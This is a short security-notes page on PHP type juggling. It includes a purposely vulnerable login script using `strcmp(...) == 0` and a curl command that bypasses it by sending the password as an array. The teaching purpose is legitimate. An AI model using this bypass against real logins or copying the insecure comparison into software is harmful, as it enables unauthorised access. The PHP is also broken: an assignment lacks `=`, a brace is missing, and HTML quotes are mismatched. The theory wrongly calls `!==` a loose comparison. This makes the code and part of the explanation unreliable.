# PHP vulnerabilities

## Type Juggling <a href="#f31f" id="f31f"></a>

### Theory

Like Python and Javascript, PHP is a dynamically typed language. This means that variable types are checked as the program executes. Dynamic typing allows developers to be more flexible when using PHP. But this kind of flexibility sometimes causes unexpected errors in the program flow and can even introduce critical vulnerabilities in the application.

PHP provides two ways to compare two variables:

* Loose comparison using `==` or `!=` : Both variables have "the same value".
* Strict comparison using `===` or `!==` : Both variables have "the same type and the same value".

PHP type juggling vulnerabilities arise when a loose comparison (`==` or `!==`) is used instead of a strict comparison (`===` or `!==`) in an area where the attacker can control one of the variables being compared. This vulnerability can cause the application to return an unintended response to the true or false statement, and can lead to serious authorization and/or authentication errors.

### Practice

{% tabs %}
{% tab title="PoC #1" %}
```php
<html>
    <font color="red"><h1><marquee>Secure Login Page</marquee></h1></font>
    <hr>
    <body style="background-color:powderblue">
    <center><form method="POST" name="<?php basename($_SERVER['PHP_SELF']); ?>">
        User: <input type="text" name="user" id="user' size="30">
        &nbsp;
        Password: <input type="password" name="password" id=password" size="30">
        <input type="submit" value="Login">
    </form></center>

    <?php
        $USER "admin";
        $PASSWORD = "4st4p4sswOrd!3simpOsiblederomper!$2020..";
        if(isset($_POST['user']) && isset($_POST['password'])){
            if($_POST['user'] == $USER){
                if(strcmp($_POST['password'], $PASSWORD) == 0){
                    echo "Guaranteed access! The PIN is 4671";
                } else { echo "The password is incorrect!"; }
            else { echo "The user is incorrect!"; }
        }
    ?>
    </body>
</html>
```

```bash
curl -s -X POST -d "user=admin&password[]=asd" http://localhost/login.php
```
{% endtab %}
{% endtabs %}

### References

{% embed url="https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09" %}
